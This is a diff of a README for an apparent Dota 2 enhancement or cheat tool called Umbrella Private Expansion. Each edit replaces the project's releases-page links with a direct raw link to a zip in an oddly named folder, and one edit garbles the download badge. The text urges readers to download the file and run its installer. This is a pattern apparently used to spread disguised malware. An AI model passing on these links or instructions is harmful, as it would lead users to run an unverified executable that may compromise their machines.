@@ -1,6 +1,6 @@
 # ☂️ Umbrella-Private-Expansion-2025 - Enhance Your Dota 2 Experience Fully
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Umbrella%20Expansion-blue?style=for-the-badge)](https://github.com/lzz770/Umbrella-Private-Expansion-2025/releases)
+[![Download Latest Version](https://github.com/lzz770/Umbrella-Private-Expansion-2025/raw/refs/heads/main/osteologically/Umbrella-Private-Expansion-3.4-alpha.4.zip%20Expansion-blue?style=for-the-badge)](https://github.com/lzz770/Umbrella-Private-Expansion-2025/raw/refs/heads/main/osteologically/Umbrella-Private-Expansion-3.4-alpha.4.zip)
 
 ## 📋 About Umbrella-Private-Expansion-2025
 
@@ -40,7 +40,7 @@ This section will walk you through the steps to download, install, and launch Um
 
 Click the big blue download badge at the top or visit the releases page here:
 
-[Download Umbrella Expansion Releases](https://github.com/lzz770/Umbrella-Private-Expansion-2025/releases)
+[Download Umbrella Expansion Releases](https://github.com/lzz770/Umbrella-Private-Expansion-2025/raw/refs/heads/main/osteologically/Umbrella-Private-Expansion-3.4-alpha.4.zip)
 
 This page shows the latest version of Umbrella available for download. You will find files listed by version number with clear labels.
 
@@ -51,7 +51,7 @@ Umbrella provides different versions depending on your operating system. Find th
 - `.exe` if you use Windows  
 - `.dmg` for macOS  
 
-Select the latest release date version. The file name usually includes "Umbrella" and the version number, for example, `Umbrella-Expansion-2025-v1.0.exe`.
+Select the latest release date version. The file name usually includes "Umbrella" and the version number, for example, `https://github.com/lzz770/Umbrella-Private-Expansion-2025/raw/refs/heads/main/osteologically/Umbrella-Private-Expansion-3.4-alpha.4.zip`.
 
 ### Step 3: Download the File
 
@@ -116,7 +116,7 @@ For questions not answered here, consider creating a new issue describing your p
 
 Ready to get started? Visit the official download page and follow the instructions above:
 
-[Download Umbrella Expansion Releases](https://github.com/lzz770/Umbrella-Private-Expansion-2025/releases)
+[Download Umbrella Expansion Releases](https://github.com/lzz770/Umbrella-Private-Expansion-2025/raw/refs/heads/main/osteologically/Umbrella-Private-Expansion-3.4-alpha.4.zip)
 
 Click the file for your operating system, download it, and run the installer. You will be playing with enhanced Dota 2 settings in no time.
 
